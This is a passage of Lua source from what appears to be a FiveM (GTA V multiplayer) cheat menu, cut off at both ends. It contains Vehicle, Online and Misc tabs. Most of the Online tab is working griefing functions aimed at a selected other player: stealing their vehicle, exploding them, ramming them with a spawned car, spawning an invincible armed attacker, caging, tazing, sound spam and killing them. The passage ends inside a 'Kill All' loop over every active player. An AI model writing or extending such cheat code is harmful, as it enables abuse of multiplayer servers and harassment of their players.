                    elseif Winnie_IsControlPressed(0, 173) and vehicle_scroll <= 0.32 then
                        New.scroll7 = New.scroll7 + 0.015
                    end
                end


                if vehicle_scroll >= 0.335 then
                    if button('Spawn Vehicle', 0.415, vehicle_scroll, false) then
                    CreateThread(function()
                        local result = KeyboardInput("Spawn Vehicle", "", 30)
                            spawn(result)
                            request("Spawn Executed!", 3000)
                        end)
                    end
                end vehicle_scroll = vehicle_scroll + 0.020

                if vehicle_scroll >= 0.335 then
                    if button('Change the plate', 0.415, vehicle_scroll, false) then
                        if Winnie_IsPedInAnyVehicle(Winnie_PlayerPedId()) then
                            local result = KeyboardInput("Enter new plate", "", 50)
                            local getVeh = Winnie_GetVehiclePedIsIn(Winnie_PlayerPedId(), true)
                            if result then
                                Winnie_SetVehicleNumberPlateText(getVeh, result)
                            end
                        end
                    end
                end vehicle_scroll = vehicle_scroll + 0.020

                if vehicle_scroll >= 0.335 then
                    if button('Repair Vehicle', 0.415, vehicle_scroll, false) then
                        if Winnie_IsPedInAnyVehicle(Winnie_PlayerPedId()) then
                            local getVeh = Winnie_GetVehiclePedIsIn(Winnie_PlayerPedId(), true)
                            Winnie_SetVehicleFixed(getVeh)
                        end
                        request("Repair Executed!", 3000)
                    end
                end vehicle_scroll = vehicle_scroll + 0.020



                if vehicle_scroll >= 0.335 then
                    if button('Delete Vehicle', 0.415, vehicle_scroll, false) then
                        if Winnie_IsPedInAnyVehicle(Winnie_PlayerPedId()) then
                            local getveh = Winnie_GetVehiclePedIsIn(Winnie_PlayerPedId(), true)
                            Winnie_DeleteEntity(getveh)
                        end
                        request("Delete Executed!", 3000)
                    end
                end vehicle_scroll = vehicle_scroll + 0.020

                if vehicle_scroll >= 0.335 then
                    if button('Vehicle at maximum', 0.415, vehicle_scroll, false) then
                        if Winnie_IsPedInAnyVehicle(Winnie_PlayerPedId()) then
                            local getvh = Winnie_GetVehiclePedIsIn(Winnie_PlayerPedId(), true)
                            max(getvh)
                        end
                    end
                end vehicle_scroll = vehicle_scroll + 0.020

                if vehicle_scroll >= 0.335 then
                    if button('Teleport to Nearest', 0.415, vehicle_scroll, false) then
                        local closest = GetClosestVehicle(Winnie_GetEntityCoords(Winnie_PlayerPedId()), 2000.0, 0, 70)
                        Winnie_SetPedIntoVehicle(Winnie_PlayerPedId(), closest, -2)
                    end
                end vehicle_scroll = vehicle_scroll + 0.020

                if vehicle_scroll >= 0.335 then
                    if button('Clean the car', 0.415, vehicle_scroll, false) then
                        if Winnie_IsPedInAnyVehicle(Winnie_PlayerPedId()) then
                            local getveh = Winnie_GetVehiclePedIsIn(Winnie_PlayerPedId(), true)
                            Winnie_SetVehicleDirtLevel(getveh, 0)
                        end
                        request("Clean Executed!", 3000)
                    end
                end vehicle_scroll = vehicle_scroll + 0.020

                if vehicle_scroll >= 0.335 then
                    if button('Refuel the car', 0.415, vehicle_scroll, false) then
                        if Winnie_IsPedInAnyVehicle(Winnie_PlayerPedId()) then
                            local getveh = Winnie_GetVehiclePedIsIn(Winnie_PlayerPedId(), true)
                            Winnie_SetVehicleFuelLevel(getveh, 100.0)
                        end
                    end
                end vehicle_scroll = vehicle_scroll + 0.020

                if vehicle_scroll >= 0.335 then
                    if button('Refuel Oil', 0.415, vehicle_scroll, false) then
                        if Winnie_IsPedInAnyVehicle(Winnie_PlayerPedId()) then
                            local getveh = Winnie_GetVehiclePedIsIn(Winnie_PlayerPedId(), true)
                            SetVehicleOilLevel(getveh, 100.0)
                        end
                        request("Refuel Executed!", 3000)
                    end
                end vehicle_scroll = vehicle_scroll + 0.020

                if vehicle_scroll <= 0.505 then
                    if button('Open all doors', 0.415, vehicle_scroll, false) then
                        if Winnie_IsPedInAnyVehicle(Winnie_PlayerPedId()) then
                            local getveh = Winnie_GetVehiclePedIsIn(Winnie_PlayerPedId(), true)
                            for i = 1, 7 do
                                Winnie_SetVehicleDoorOpen(getveh, i, true, true)
                            end
                        end
                    end
                end vehicle_scroll = vehicle_scroll + 0.020

                if vehicle_scroll <= 0.515 then
                    if button('Close all doors', 0.415, vehicle_scroll, false) then
                        if Winnie_IsPedInAnyVehicle(Winnie_PlayerPedId()) then
                            local getveh = Winnie_GetVehiclePedIsIn(Winnie_PlayerPedId(), true)
                            for i = 1, 7 do
                                Winnie_SetVehicleDoorShut(getveh, i, true, true)
                            end
                        end
                    end
                end vehicle_scroll = vehicle_scroll + 0.020


                local vehicle_scroll2 = 0.34 + New.scroll9
                local menu_position, menu_position_y = New.x, New.y
                if mouseInBounds(0.52 + menu_position, 0.30 + menu_position_y, 0.10, 0.45) then

                    if Winnie_IsDisabledControlPressed(0, 14)  and vehicle_scroll2 >= 0.175 then
                        New.scroll9 = New.scroll9 - 0.015
                    elseif Winnie_IsDisabledControlJustPressed(0, 15) and vehicle_scroll2 <= 0.33 then
                        New.scroll9 = New.scroll9 + 0.015
                    elseif Winnie_IsControlPressed(0, 172) and vehicle_scroll2 >= 0.175 then
                        New.scroll9 = New.scroll9 - 0.015
                    elseif Winnie_IsControlPressed(0, 173) and vehicle_scroll2 <= 0.32 then
                        New.scroll9 = New.scroll9 + 0.015
                    end
                end


                if vehicle_scroll2 >= 0.34 then
                    if checkbox('Instant Brake', 0.510, vehicle_scroll2, ZM_M1000.vbrajke) then
                        ZM_M1000.vbrajke = not ZM_M1000.vbrajke
                        local numberbrake = ZM_M1000.vbrajke
                        if saveconfig == true then
                            if numberbrake == nil or numberbrake == false then
                                SetResourceKvp("numberbrake", "nil")
                            else
                                SetResourceKvp("numberbrake", numberbrake)
                            end
                        else
                            return false
                        end
                    end
                end vehicle_scroll2 = vehicle_scroll2 + 0.025

                if vehicle_scroll2 >= 0.34 then
                    if checkbox('Invisible', 0.510, vehicle_scroll2, ZM_M1000.vinvisible) then
                        ZM_M1000.vinvisible = not ZM_M1000.vinvisible
                    end
                end vehicle_scroll2 = vehicle_scroll2 + 0.025




                if vehicle_scroll2 >= 0.34 then
                    if checkbox('Drift', 0.510, vehicle_scroll2, ZM_M1000.vdrift) then
                        ZM_M1000.vdrift = not ZM_M1000.vdrift
                        local numberdrft = ZM_M1000.vdrift
                        if saveconfig == true then
                            if numberdrft == nil or numberdrft == false then
                                SetResourceKvp("numberdrft", "nil")
                            else
                                SetResourceKvp("numberdrft", numberdrft)
                            end
                        else
                            return false
                        end
                    end
                end vehicle_scroll2 = vehicle_scroll2 + 0.025


                if vehicle_scroll2 >= 0.34 then
                    if checkbox('Boost', 0.510, vehicle_scroll2, ZM_M1000.vboost) then
                        ZM_M1000.vboost = not ZM_M1000.vboost
                        local numberboost = ZM_M1000.vboost
                        if saveconfig == true then
                            if numberboost == nil or numberboost == false then
                                SetResourceKvp("numberboost", "nil")
                            else
                                SetResourceKvp("numberboost", numberboost)
                            end
                        else
                            return false
                        end
                    end
                end vehicle_scroll2 = vehicle_scroll2 + 0.025

                if vehicle_scroll2 >= 0.34 then
                    if checkbox('Jump', 0.510, vehicle_scroll2, ZM_M1000.vjump) then
                        ZM_M1000.vjump = not ZM_M1000.vjump
                        local numberjump = ZM_M1000.vjump
                        if saveconfig == true then
                            if numberjump == nil or numberjump == false then
                                SetResourceKvp("numberjump", "nil")
                            else
                                SetResourceKvp("numberjump", numberjump)
                            end
                        else
                            return false
                        end
                    end
                end vehicle_scroll2 = vehicle_scroll2 + 0.025


                if vehicle_scroll2 >= 0.34 then
                    if checkbox('Handling', 0.510, vehicle_scroll2, ZM_M1000.handling) then
                        ZM_M1000.handling = not ZM_M1000.handling
                        local numberhandling = ZM_M1000.handling
                        if saveconfig == true then
                            if numberhandling == nil or numberhandling == false then
                                SetResourceKvp("numberhandling", "nil")
                            else
                                SetResourceKvp("numberhandling", numberhandling)
                            end
                        else
                            return false
                        end
                    end
                end vehicle_scroll2 = vehicle_scroll2 + 0.025


                if vehicle_scroll2 >= 0.34 then
                    if checkbox('Auto-Repair', 0.510, vehicle_scroll2, ZM_M1000.autrepair) then
                        ZM_M1000.autrepair = not ZM_M1000.autrepair
                        local numberautorepair = ZM_M1000.autrepair
                        if saveconfig == true then
                            if numberautorepair == nil or numberautorepair == false then
                                SetResourceKvp("numberautorepair", "nil")
                            else
                                SetResourceKvp("numberautorepair", numberautorepair)
                            end
                        else
                            return false
                        end
                    end
                end vehicle_scroll2 = vehicle_scroll2 + 0.025





                if vehicle_scroll2 <= 0.49 then
                    if checkbox('Nitro', 0.510, vehicle_scroll2, ZM_M1000.vnitro) then
                        ZM_M1000.vnitro = not ZM_M1000.vnitro
                        local numbernitro = ZM_M1000.vnitro
                        if saveconfig == true then
                            if numbernitro == nil or numbernitro == false then
                                SetResourceKvp("numbernitro", "nil")
                            else
                                SetResourceKvp("numbernitro", numbernitro)
                            end
                        else
                            return false
                        end
                    end
                end vehicle_scroll2 = vehicle_scroll2 + 0.025


                if vehicle_scroll2 <= 0.49 then
                    if checkbox('Rainbow Car', 0.510, vehicle_scroll2, ZM_M1000.rcar) then
                        ZM_M1000.rcar = not ZM_M1000.rcar
                    end
                end vehicle_scroll2 = vehicle_scroll2 + 0.025


                if vehicle_scroll2 <= 0.49 then
                    if checkbox('Vehicle Color', 0.510, vehicle_scroll2, ZM_M1000.vcol) then
                        ZM_M1000.vcol = not ZM_M1000.vcol
                    end
                end vehicle_scroll2 = vehicle_scroll2 + 0.025

                if vehicle_scroll2 <= 0.49 then
                    if checkbox('Spawn Inside', 0.510, vehicle_scroll2, ZM_M1000.spawninside) then
                        ZM_M1000.spawninside = not ZM_M1000.spawninside
                    end
                end vehicle_scroll2 = vehicle_scroll2 + 0.025


                local vehicle_scroll = 0.34 + New.scroll
                local menu_position, menu_position_y = New.x, New.y

                if mouseInBounds(0.70 + New.x, 0.50 + New.y, 0.17, 0.50) then
                    if Winnie_IsDisabledControlPressed(0, 14) then
                        New.scroll8 = New.scroll8 - 0.015
                    elseif Winnie_IsDisabledControlJustPressed(0, 15) then
                        New.scroll8 = New.scroll8 + 0.015
                    elseif Winnie_IsControlPressed(0, 174) then
                        New.scroll8 = New.scroll8 - 0.005
                    elseif Winnie_IsControlPressed(0, 175) then
                        New.scroll8 = New.scroll8 + 0.005
                    end

                    if New.scroll8 > 0.06 then
                        New.scroll8 = 0.06
                    elseif New.scroll8 <= 0.0 then
                        New.scroll8 = 0.0
                    end
                end

                if mouseInBounds(New.x + 0.495, New.y + 0.565, 0.03, 0.03) and not ZM_M1000.vcol then
                    local x, y = Winnie_GetNuiCursorPosition()
                    local screenX, screenY = Winnie_GetActiveScreenResolution()
                    local cursorX, cursorY = x / screenX, y / screenY
                    Winnie_DrawText("[Active checkbox Vehicle Color for use color]", cursorX + 0.02, cursorY, false, 0.25, false, 255, 255, 255, 190)
                elseif mouseInBounds(New.x + 0.485, New.y  + 0.69, 0.03, 0.03) and not ZM_M1000.vboost then
                    local x, y = Winnie_GetNuiCursorPosition()
                    local screenX, screenY = Winnie_GetActiveScreenResolution()
                    local cursorX, cursorY = x / screenX, y / screenY
                    Winnie_DrawText("[Active checkbox Boost for use boost]", cursorX + 0.02, cursorY, false, 0.25, false, 255, 255, 255, 190)
                end

                if not ZM_M1000.vcol then
                    Winnie_DrawText("[?]", New.x + 0.495, New.y  + 0.565, true, 0.26, false, 252, 244, 3, 255)
                end

                if not ZM_M1000.vboost then
                    Winnie_DrawText("[?]", New.x + 0.485, New.y  + 0.69, true, 0.26, false, 252, 244, 3, 255)
                end

                local vehiclePosition3 = 0.34
                for k, v in pairs(vehicle.vehicle3) do
                    if button(v.button, 0.64 + New.scroll8, vehiclePosition3) then
                        spawn(v.name)
                    end
                    vehiclePosition3 = vehiclePosition3 + 0.020
                end

                local vehiclePosition2 = 0.34
                if New.scroll8 <= 0.06 then
                    for k, v in pairs(vehicle.vehicle2) do
                        if button(v.button, 0.690 + New.scroll8, vehiclePosition2) then
                            spawn(v.name)
                        end
                        vehiclePosition2 = vehiclePosition2 + 0.020
                    end
                end

                local vehiclePosition1 = 0.34
                if New.scroll8 <= 0.025 then
                    for k, v in pairs(vehicle.vehicle1) do
                        if button(v.button, 0.730 + New.scroll8, vehiclePosition1) then
                            spawn(v.name)
                        end
                        vehiclePosition1 = vehiclePosition1 + 0.020
                    end
                end

                local vehiclePosition4 = 0.34
                if New.scroll8 > 0.025 then
                    for k, v in pairs(vehicle.vehicle4) do
                        if button(v.button, 0.600 + New.scroll8, vehiclePosition4) then
                            spawn(v.name)
                        end
                        vehiclePosition4 = vehiclePosition4 + 0.020
                    end
                 end



                button('Color R', 0.415, 0.560, false)
                Winnie_DrawRect(New.x + 0.48, New.y + 0.576, 0.004, 0.007, math.floor(255 * rE_Slider["Slider_colorvehilcer_value"]), math.floor(255 * rE_Slider["Slider_colorvehilceg_value"]), math.floor(255 * rE_Slider["Slider_colorvehilceb_value"]), 255)
                Winnie_DrawRect(New.x + 0.48, New.y + 0.619, 0.004, 0.007, math.floor(255 * rE_Slider["Slider_colorvehilcer_value"]), math.floor(255 * rE_Slider["Slider_colorvehilceg_value"]), math.floor(255 * rE_Slider["Slider_colorvehilceb_value"]), 255)
                Winnie_DrawRect(New.x + 0.48, New.y + 0.66, 0.004, 0.007, math.floor(255 * rE_Slider["Slider_colorvehilcer_value"]), math.floor(255 * rE_Slider["Slider_colorvehilceg_value"]), math.floor(255 * rE_Slider["Slider_colorvehilceb_value"]), 255)

                slider2(0.428, 0.579, 0.08, "colorvehilcer", 255)

                button('Color G', 0.415, 0.600, false)


                slider2(0.428, 0.622, 0.08, "colorvehilceg", 255)

                button('Color B', 0.415, 0.640, false)


                slider2(0.428, 0.662, 0.08, "colorvehilceb", 255)

                button('Boost Speed', 0.415, 0.680, false)
                slider2(0.428, 0.702, 0.08, "jumpintensity", 50)


                -- if checkbox('Ls Custom', 0.510, 0.650, ZM_M1000.lscutom) then
                --     ZM_M1000.lscutom = not ZM_M1000.lscutom
                -- end

                function openlstcustom()
                    local player = Winnie_GetPlayerPed(-1)
                    local vehicle = Winnie_GetVehiclePedIsIn(player)
                    print(vehicle)
                    if vehicle ~= 0 then

                        Winnie_DrawRect(0.85, 0.13, 0.295, 0.25, 255, 255, 255, 120) --- 21 21 21
                        Winnie_DrawRect(0.85, 0.13, 0.29, 0.24, 29, 29, 29, 255)
                        -- line
                        Winnie_DrawText2("LS CUSTOM", 0.83, 0.02, false, 0.30, false, 255, 255, 255, 255)
                        Winnie_DrawRect(0.85, 0.05, 0.29, 0.004, 255, 255, 255, 120)



                        if button4('Color', 0.75, 0.15) then
                            Colorchoice = true
                        end


                    else
                        request("You are not in vehicle !", 2000)
                        return
                    end
                end

                if ZM_M1000.lscutom then
                    openlstcustom()
                end

                Winnie_DrawRect(New.x + 0.675, New.y + 0.71, 0.145, 0.01, 30, 30, 30, New.opacity)
                Winnie_DrawRect(New.x + 0.644 + New.scroll8, New.y + 0.71, 0.087, 0.01, math.floor(255 * rE_Slider["Slider_colormenur_value"]), math.floor(255 * rE_Slider["Slider_colormenug_value"]), math.floor(255 * rE_Slider["Slider_colormenub_value"]), 255)



                Winnie_DrawRect(New.x + 0.38, New.y + 0.415, 0.0016, 0.18, 60, 60, 60, 255)
                Winnie_DrawRect(New.x + 0.38, New.y + 0.505 + New.scroll7 * 1.06, 0.0016, 0.0080, math.floor(255 * rE_Slider["Slider_colormenur_value"]), math.floor(255 * rE_Slider["Slider_colormenug_value"]), math.floor(255 * rE_Slider["Slider_colormenub_value"]), 255)

                Winnie_DrawRect(New.x + 0.545, New.y + 0.415, 0.0016, 0.18, 60, 60, 60, 255)
                Winnie_DrawRect(New.x + 0.545, New.y + 0.505 + New.scroll9 * 0.98, 0.0016, 0.0080, math.floor(255 * rE_Slider["Slider_colormenur_value"]), math.floor(255 * rE_Slider["Slider_colormenug_value"]), math.floor(255 * rE_Slider["Slider_colormenub_value"]), 255)

            end


            if taberino == 'Online' then
                local online_scroll = 0.335 + New.scroll14
                local menu_position, menu_position_y = New.x, New.y


                local playerlist = GetActivePlayers()
                if ZM_M1000.select == nil then
                    ZM_M1000.select = playerlist[1]
                end

                if #GetActivePlayers() >= 30 then
                    if Winnie_IsDisabledControlJustPressed(0, 15) then
                        New.jailamlroptipr = New.jailamlroptipr + 0.015
                    end
                    if Winnie_IsDisabledControlJustPressed(0, 14) then
                        New.jailamlroptipr = New.jailamlroptipr - 0.015
                    end
                end
                for i = 1, #GetActivePlayers() do
                    local currPlayer = playerlist[i]

                    if ((0.26 * 1.0) + (i - 1) * 0.02) + New.jailamlroptipr >= 0.295 and ((0.26 * 1.0) + (i - 1) * 0.02) + New.jailamlroptipr <= 0.68 then

                        if currPlayer == ZM_M1000.select then
                            if PlayerGet(" ~r~>~r~~w~ (" ..Winnie_GetPlayerServerId(currPlayer) ..")" .. " | " .. Winnie_GetPlayerName(currPlayer),0.609,((0.295 * 1.0) + (i - 1) * 0.02) + New.jailamlroptipr, false) then
                                ZM_M1000.select = currPlayer
                            end
                        else
                        if PlayerGet("(" ..Winnie_GetPlayerServerId(currPlayer) ..")" .. " | " .. Winnie_GetPlayerName(currPlayer),0.609,((0.295 * 1.0) + (i - 1) * 0.02) + New.jailamlroptipr, false) then
                            ZM_M1000.select = currPlayer
                            end
                        end
                    end
                end



                if mouseInBounds(0.4 + menu_position, 0.30 + menu_position_y, 0.10, 0.45) then

                    if Winnie_IsDisabledControlPressed(0, 14)  and online_scroll >= 0.175 then
                        New.scroll14 = New.scroll14 - 0.015
                    elseif Winnie_IsDisabledControlJustPressed(0, 15) and online_scroll <= 0.32 then
                        New.scroll14 = New.scroll14 + 0.015
                    elseif Winnie_IsControlPressed(0, 172) and online_scroll >= 0.175 then
                        New.scroll14 = New.scroll14 - 0.015
                    elseif Winnie_IsControlPressed(0, 173) and online_scroll <= 0.32 then
                        New.scroll14 = New.scroll14 + 0.015
                    end
                end


                if online_scroll >= 0.335 then
                    if button('Give All', 0.415, online_scroll, false) then
                        local ped = Winnie_GetPlayerPed(ZM_M1000.select)
                        for k, v in pairs(weapons) do
                            Winnie_GiveWeaponToPed(ped, Winnie_GetHashKey(v), 250, false, false)
                        end
                    end
                end online_scroll = online_scroll + 0.020

                if online_scroll >= 0.335 then
                    if button('Remove All', 0.415, online_scroll, false) then
                        local ped = Winnie_GetPlayerPed(ZM_M1000.select)
                        Winnie_RemoveAllPedWeapons(ped, true)
                    end
                end online_scroll = online_scroll + 0.020

                if online_scroll >= 0.335 then
                    if button('Remove Specific', 0.415, online_scroll, false) then
                        local ped = Winnie_GetPlayerPed(ZM_M1000.select)
                        local result = KeyboardInput("Name of weapon", "", 30)
                        if result then
                            Winnie_RemoveWeaponFromPed(ped, Winnie_GetHashKey(result))
                        end
                    end
                end online_scroll = online_scroll + 0.020

                if online_scroll >= 0.335 then
                    if button('Give Specific', 0.415, online_scroll, false) then
                    local ped = Winnie_GetPlayerPed(ZM_M1000.select)
                    local result = KeyboardInput("Name of weapon", "", 30)

                    if result then
                        Winnie_GiveWeaponToPed(ped, Winnie_GetHashKey(result), 250, false, false)
                        end
                    end
                end online_scroll = online_scroll + 0.020

                if online_scroll >= 0.335 then
                    if button('Teleport to player', 0.415, online_scroll, false) then
                    local _get = Winnie_GetEntityCoords(Winnie_GetPlayerPed(ZM_M1000.select))
                    Winnie_SetEntityCoords(Winnie_PlayerPedId(), _get)
                    end
                end online_scroll = online_scroll + 0.020

                if online_scroll >= 0.335 then
                    if button('Teleport into Vehicle', 0.415, online_scroll, false) then
                        local vehicle = Winnie_GetVehiclePedIsIn(Winnie_GetPlayerPed(ZM_M1000.select))
                        if Winnie_IsVehicleSeatFree(vehicle, 0) then
                            Winnie_SetPedIntoVehicle(Winnie_PlayerPedId(), vehicle, 0)
                        end

                    end
                end online_scroll = online_scroll + 0.020

                if online_scroll >= 0.335 then
                    if button('Steal Vehicle', 0.415, online_scroll, false) then
                        local ped = Winnie_GetPlayerPed(ZM_M1000.select)
                        local vehofped = Winnie_GetVehiclePedIsIn(ped)
                        Winnie_TaskLeaveVehicle(ped, vehofped, 16)
                    end
                end online_scroll = online_scroll + 0.020

                if online_scroll >= 0.335 then
                    if button('Give Armor', 0.415, online_scroll, false) then
                        local _get = Winnie_GetEntityCoords(Winnie_GetPlayerPed(ZM_M1000.select))
                        CreatePickup(Winnie_GetHashKey("PICKUP_ARMOUR_STANDARD"), _get)
                    end
                end online_scroll = online_scroll + 0.020

                if online_scroll >= 0.335 then
                    if button('Give Heal', 0.415, online_scroll, false) then
                        local _get = Winnie_GetEntityCoords(Winnie_GetPlayerPed(ZM_M1000.select))
                        CreatePickup(Winnie_GetHashKey("PICKUP_HEALTH_STANDARD"), _get)
                    end
                end online_scroll = online_scroll + 0.020

                if online_scroll <= 0.505 then
                    if button('Clone Ped', 0.415, online_scroll, false) then
                        local ped = Winnie_GetPlayerPed(ZM_M1000.select)
                        local coordsped = Winnie_GetEntityCoords(ped)
                        local ped_hash = Winnie_GetEntityModel(Winnie_GetPlayerPed(ZM_M1000.select))
                        Winnie_CreatePed(1, ped_hash, coordsped.x, coordsped.y, coordsped.z + 1.0, 90.0, true, false)
                    end
                end online_scroll = online_scroll + 0.020

                if online_scroll <= 0.515 then
                    if button('Give Vehicle', 0.415, online_scroll, false) then
                    CreateThread(function()
                            local result = KeyboardInput("Name of your vehicle", "", 30)

                            if result then
                                Winnie_RequestModel(result)
                                while not Winnie_HasModelLoaded(result) do
                                    Wait(0)
                                end
                                Winnie_CreateVehicle(Winnie_GetHashKey(result),Winnie_GetEntityCoords(Winnie_GetPlayerPed(ZM_M1000.select)),Winnie_GetEntityHeading(Winnie_GetPlayerPed(ZM_M1000.select)),true,true)
                            end
                        end)
                    end
                end online_scroll = online_scroll + 0.020

                if online_scroll <= 0.51 then
                    if button('Ennemy Ped', 0.415, online_scroll, false) then
                        local ped_hash = Winnie_GetEntityModel(Winnie_GetPlayerPed(ZM_M1000.select))
                        local coords = Winnie_GetEntityCoords(Winnie_GetPlayerPed(ZM_M1000.select))
                        local ped = Winnie_CreatePed(29, ped_hash,coords.x,coords.y,coords.z + 1.0,0,true,true)
                        Winnie_GiveWeaponToPed(ped,Winnie_GetHashKey("weapon_microsmg"),9999,1, 1)
                        TaskCombatPed(ped,Winnie_GetPlayerPed(ZM_M1000.select),0,16)
                        Winnie_SetEntityInvincible(ped, true)
                    end
                end online_scroll = online_scroll + 0.020

                if online_scroll <= 0.515 then
                    if button('Copy Outfit', 0.415, online_scroll, false) then
                        local model = GetEntityModel(GetPlayerPed(ZM_M1000.select))
                        SetPlayerModel(PlayerId(), model)
                        ClonePedToTarget(PlayerPedId(), GetPlayerPed(ZM_M1000.select))
                    end
                end online_scroll = online_scroll + 0.020

                if online_scroll <= 0.51 then
                    if button('Explode', 0.415, online_scroll, false) then
                        local coords = Winnie_GetEntityCoords(Winnie_GetPlayerPed(ZM_M1000.select))
                        Winnie_AddExplosion(coords, math.floor(82  * rE_Slider["Slider_explodetypeonline_value"]), 999.0, true, false, true)
                    end
                end online_scroll = online_scroll + 0.020

                if online_scroll <= 0.51 then
                    if button('Attach to Player', 0.415, online_scroll, false) then
                        local coords = Winnie_GetEntityCoords(Winnie_GetPlayerPed(ZM_M1000.select))
                        local object = Winnie_IsCreateObject(Winnie_GetHashKey("prop_ballistic_shield_lod1"), coords, true, true, true)
                        Winnie_AttachEntityToEntity(object, Winnie_GetPlayerPed(ZM_M1000.select), Winnie_GetPedBoneIndex(Winnie_GetPlayerPed(ZM_M1000.select), 0), coords,  true, true, false, true, 1, true)
                    end
                end online_scroll = online_scroll + 0.020

                if online_scroll <= 0.515 then
                    if button('Carkill Player', 0.415, online_scroll, false) then
                        CreateThread(function()
                            local hash = "adder"
                            Winnie_RequestModel(hash)
                            while not Winnie_HasModelLoaded(hash) do
                                Wait(0)
                            end

                            local vehicle = Winnie_CreateVehicle(hash, Winnie_GetEntityCoords(Winnie_GetPlayerPed(ZM_M1000.select)), true, false)
                            Winnie_SetVehicleForwardSpeed(vehicle, 100.0)
                            end)
                        end
                    end online_scroll = online_scroll + 0.020




                    if online_scroll <= 0.515 then
                        if button('Ear Rape', 0.415, online_scroll, false) then
                            CreateThread(function()
                                    local coordsPlayer = Winnie_GetEntityCoords(Winnie_GetPlayerPed(ZM_M1000.select))
                                    Winnie_PlaySoundFromCoord(-1, "CHECKPOINT_MISSED", coordsPlayer.x, coordsPlayer.y, coordsPlayer.z, "HUD_MINI_GAME_SOUNDSET", true, 1.0, true)
                                    Winnie_PlaySoundFromCoord(-1, "Power_Down", coordsPlayer.x, coordsPlayer.y, coordsPlayer.z, "DLC_HEIST_HACKING_SNAKE_SOUNDS", true, 1.0, true)
                                end)
                            end
                        end online_scroll = online_scroll + 0.020


                local online_scroll2 = 0.34 + New.scroll10
                local menu_position, menu_position_y = New.x, New.y
                if mouseInBounds(0.52 + menu_position, 0.30 + menu_position_y, 0.10, 0.45) then

                    if Winnie_IsDisabledControlPressed(0, 14)  and online_scroll2 >= 0.175 then
                        New.scroll10 = New.scroll10 - 0.015
                    elseif Winnie_IsDisabledControlJustPressed(0, 15) and online_scroll2 <= 0.33 then
                        New.scroll10 = New.scroll10 + 0.015
                    elseif Winnie_IsControlPressed(0, 172) and online_scroll2 >= 0.175 then
                        New.scroll10 = New.scroll10 - 0.015
                    elseif Winnie_IsControlPressed(0, 173) and online_scroll2 <= 0.32 then
                        New.scroll10 = New.scroll10 + 0.015
                    end
                end


                if online_scroll2 >= 0.34 then
                    if checkbox('Spectate', 0.510, online_scroll2, ZM_M1000.spec) then
                        ZM_M1000.spec = not ZM_M1000.spec
                    end
                end online_scroll2 = online_scroll2 + 0.025

                if online_scroll2 >= 0.34 then
                    if checkbox('Find Player', 0.510, online_scroll2, ZM_M1000.fdplayer) then
                        ZM_M1000.fdplayer = not ZM_M1000.fdplayer
                    end
                end online_scroll2 = online_scroll2 + 0.025


                if online_scroll2 >= 0.34 then
                    if checkbox('Molotov Player', 0.510, online_scroll2, ZM_M1000.mtvplayer) then
                        ZM_M1000.mtvplayer = not ZM_M1000.mtvplayer
                    end
                end online_scroll2 = online_scroll2 + 0.025


                if online_scroll2 >= 0.34 then
                    if checkbox('Taze Player', 0.510, online_scroll2, ZM_M1000.tzplayer) then
                        ZM_M1000.tzplayer = not ZM_M1000.tzplayer
                    end
                end online_scroll2 = online_scroll2 + 0.025


                if online_scroll2 >= 0.34 then
                    if checkbox('Hydrant Player', 0.510, online_scroll2, ZM_M1000.hyplayer) then
                        ZM_M1000.hyplayer = not ZM_M1000.hyplayer
                    end
                end online_scroll2 = online_scroll2 + 0.025


                if online_scroll2 >= 0.34 then
                    if checkbox('Kill Player', 0.510, online_scroll2, ZM_M1000.killplayerrr) then
                        ZM_M1000.killplayerrr = not ZM_M1000.killplayerrr
                    end
                end online_scroll2 = online_scroll2 + 0.025


                if online_scroll2 >= 0.34 then
                    if checkbox('Cage Player', 0.510, online_scroll2, ZM_M1000.cgplayerm100teb) then
                        ZM_M1000.cgplayerm100teb = not ZM_M1000.cgplayerm100teb
                    end
                end online_scroll2 = online_scroll2 + 0.025


                if online_scroll2 <= 0.49 then
                    if checkbox('Spam Car', 0.510, online_scroll2, ZM_M1000.spermecar) then
                        ZM_M1000.spermecar = not ZM_M1000.spermecar
                    end
                end online_scroll2 = online_scroll2 + 0.025

                if online_scroll2 <= 0.49 then
                    if checkbox('Launch Player', 0.510, online_scroll2, ZM_M1000.launchplayer) then
                        ZM_M1000.launchplayer = not ZM_M1000.launchplayer
                    end
                end online_scroll2 = online_scroll2 + 0.025



                button('Explode Type', 0.415, 0.565)
                slider2(0.428, 0.59, 0.08, "explodetypeonline", 82)


                button('Force Launch', 0.415, 0.62)
                slider2(0.428, 0.649, 0.08, "launchplayer", 6)

                Winnie_DrawRect(New.x + 0.38, New.y + 0.415, 0.001, 0.18, 60, 60, 60, 255)
                Winnie_DrawRect(New.x + 0.38, New.y + 0.505 + New.scroll14 * 1.06, 0.001, 0.0080, math.floor(255 * rE_Slider["Slider_colormenur_value"]), math.floor(255 * rE_Slider["Slider_colormenug_value"]), math.floor(255 * rE_Slider["Slider_colormenub_value"]), 255)

                Winnie_DrawRect(New.x + 0.546, New.y + 0.415, 0.001, 0.18, 60, 60, 60, 255)
                Winnie_DrawRect(New.x + 0.546, New.y + 0.505 + New.scroll10 * 0.99, 0.001, 0.0080, math.floor(255 * rE_Slider["Slider_colormenur_value"]), math.floor(255 * rE_Slider["Slider_colormenug_value"]), math.floor(255 * rE_Slider["Slider_colormenub_value"]), 255)
            end


            if taberino == 'Misc' then

                local misc_scroll = 0.335 + New.scroll12
                if mouseInBounds(0.4 + New.x, 0.30 + New.y, 0.10, 0.45) then

                    if Winnie_IsDisabledControlPressed(0, 14)  and misc_scroll >= 0.175 then
                        New.scroll12 = New.scroll12 - 0.015
                    elseif Winnie_IsDisabledControlJustPressed(0, 15) and misc_scroll <= 0.32 then
                        New.scroll12 = New.scroll12 + 0.015
                    elseif Winnie_IsControlPressed(0, 172) and misc_scroll >= 0.175 then
                        New.scroll12 = New.scroll12 - 0.015
                    elseif Winnie_IsControlPressed(0, 173) and misc_scroll <= 0.32 then
                        New.scroll12 = New.scroll12 + 0.015
                    end
                end


                if misc_scroll >= 0.335 then
                    if button('Kill All', 0.415, misc_scroll, false) then
                        print('kill all')
                        for k, v in pairs(GetActivePlayers()) do
                            local pedSelect = Winnie_GetPlayerPed(v)
                            local coordsPlayer = Winnie_GetEntityCoords(pedSelect)
                            local boneCoords = Winnie_GetPedBoneCoords(pedSelect, 31086, 0, 0, 0)
